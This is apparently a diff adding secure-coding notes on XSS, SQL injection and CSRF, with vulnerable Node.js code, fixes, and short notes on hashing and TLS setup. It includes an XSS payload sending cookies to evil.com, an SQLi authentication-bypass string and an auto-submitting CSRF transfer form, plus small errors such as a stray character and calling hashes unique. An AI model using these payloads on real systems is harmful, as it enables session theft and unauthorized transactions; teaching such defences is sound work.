@@ -65,3 +65,90 @@ Authorization determines *what* an authenticated user is allowed to do.
 ### References and Credits
 *   **Source**: Notes taken from @wattier-mg2kj's comment in the video -  [Sriniously's Backend Security: Everything You Need to Know](https://www.youtube.com/watch?v=xB1C1xZZW4k&list=PLui3EUkuMTPgZcV0QhQrOcwMPcBCcd_Q1&index=20)
 
+---
+
+### Common Vulnerabilities & Code Examples
+
+#### Cross-Site Scripting (XSS)
+An attack where malicious scripts are injected into trusted websites and executed in the victim's browser.
+
+*   **Vulnerable Code (Node.js / Express)**:
+    ```javascript
+    // Vulnerable: Directly reflecting raw user input into HTML
+    app.get('/search', (req, res) => {
+      const query = req.query.q;
+      res.send(`<h1>Search results for: ${query}</h1>`);
+      // Exploit payload: ?q=<script>fetch('http://evil.com?c='+document.cookie)</script>
+    });X
+    ```
+*   **Secure Code (Fix)**:
+    ```javascript
+    const escapeHtml = require('escape-html');
+    app.get('/search', (req, res) => {
+      // Escape HTML characters (<, >, &, ", ') to neutralize scripts
+      const query = escapeHtml(req.query.q);
+      res.send(`<h1>Search results for: ${query}</h1>`);
+    });
+    ```
+
+#### SQL Injection (SQLi)
+An attack where user input is interpreted as database commands, allowing unauthorized access or modification of data.
+
+*   **Vulnerable Code (Node.js / pg)**:
+    ```javascript
+    // Vulnerable: Direct string concatenation
+    const query = `SELECT * FROM users WHERE email = '${req.body.email}'`;
+    db.query(query);
+    // Exploit payload: email = "admin@site.com' OR '1'='1"
+    // Resulting query: SELECT * FROM users WHERE email = 'admin@site.com' OR '1'='1' (bypasses authentication)
+    ```
+*   **Secure Code (Fix)**:
+    ```javascript
+    // Secure: Separates query structure from user data using parameterized parameters
+    const query = 'SELECT * FROM users WHERE email = $1';
+    db.query(query, [req.body.email]);
+    ```
+
+#### Cross-Site Request Forgery (CSRF)
+An attack that forces an authenticated user to execute unwanted actions on a web application where they are currently authenticated (e.g., clicking a link on `evil.com` triggers a transfer on `bank.com`).
+
+*   **Vulnerable Code (Attacker's Exploit on `evil.com`)**:
+    ```html
+    <!-- Hosted on evil.com: Automatically submits a POST request to victim's bank using their active session cookie -->
+    <form id="csrfForm" action="https://bank.com/api/transfer" method="POST">
+      <input type="hidden" name="to" value="attacker_acc" />
+      <input type="hidden" name="amount" value="5000" />
+    </form>
+    <script>
+      document.getElementById('csrfForm').submit();
+    </script>
+    ```
+*   **Secure Code (Fix)**:
+    ```javascript
+    // Mitigate by enforcing strict SameSite cookie policies
+    res.cookie('sessionId', session.id, {
+      httpOnly: true,
+      secure: true,
+      sameSite: 'Lax' // Or 'Strict'. Browser will not send this cookie on cross-site requests.
+    });
+    
+    // OR use Anti-CSRF Tokens (Double-Submit Cookie pattern)
+    ```
+
+### Algorithms
+
+#### Hashing
+The process of converting a data of arbitrary size to a string of characters unique to that data.
+
+#### Secure Socket Layer (SSL) / Transport Layer Security (TLS)
+
+Both SSL and TSL are cryptographic protocols used to secure the transmission of data between two computers on a network.
+
+**Steps to Setup SSL/TLS on a Server**
+1. **Generate Private Key & CSR**: Generate a private key and a Certificate Signing Request (CSR) containing your domain details on your server.
+2. **Request Certificate from CA**: Submit the CSR to a trusted Certificate Authority (CA) (e.g., Let's Encrypt) and complete the domain ownership challenge (DNS or HTTP-based verification).
+3. **Download Certificate Bundle**: Retrieve the signed certificate along with the intermediate CA certificates from the authority.
+4. **Configure Web Server/Proxy**: Install the private key and certificate files in your web server/reverse proxy config (e.g., Nginx, Apache, or cloud load balancer) and listen on port 443.
+5. **Redirect HTTP to HTTPS**: Configure an HTTP 301 redirect rule to automatically forward all port 80 (HTTP) traffic to port 443 (HTTPS) to enforce secure connections.
+
+Reference - [Backend Cheat Sheet](https://github.com/cheatsnake/backend-cheats#common-vulnerabilities-and-threats)
